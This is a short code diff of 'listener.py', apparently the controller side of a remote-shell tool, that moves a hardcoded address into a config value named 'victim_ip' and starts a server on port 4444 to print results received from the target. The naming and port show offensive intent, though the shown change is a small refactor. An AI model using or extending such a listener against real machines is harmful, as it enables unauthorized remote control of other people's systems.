@@ -1,5 +1,7 @@
 # listener.py
-import socket, json, base64
+import socket, json, base64, config
+
+victim_ip = config.VICTIM_IP
 
 def server(ip, port):
     global target
@@ -41,5 +43,5 @@ def run():
             result = recieve().encode('utf-8')
             print(result.decode('utf-8'))
             
-server('192.168.1.102', 4444)
+server(victim_ip, 4444)
 run()
